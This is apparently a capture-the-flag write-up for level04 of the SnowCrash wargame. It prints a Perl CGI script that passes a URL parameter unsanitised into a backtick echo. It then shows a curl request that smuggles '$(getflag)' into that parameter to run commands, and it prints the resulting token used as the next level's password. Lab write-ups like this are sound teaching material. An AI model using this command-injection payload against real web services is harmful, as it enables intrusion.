# level04

We found an script Perl in home directory.
I we try to see the content 

``` bash
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));

```
in the script we have some information it uses CGI so a web server and it seems to happen something on localhost:4747 but also that the script has a function x() waiting for the parameter x, this function seems to display the value of the argument x via echo

```

level04@SnowCrash:~$ curl localhost:4747/?x=cucarachos
cucarachos

```

We can inject a subshell so that echo displays its results

```

level04@SnowCrash:~$ curl 'localhost:4747?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

```

## GETFLAG

```bash
┌──$ level04@SnowCrash:~$ su level05
└─> Password: ne2searoevaevoem4ov4ar8ap
```
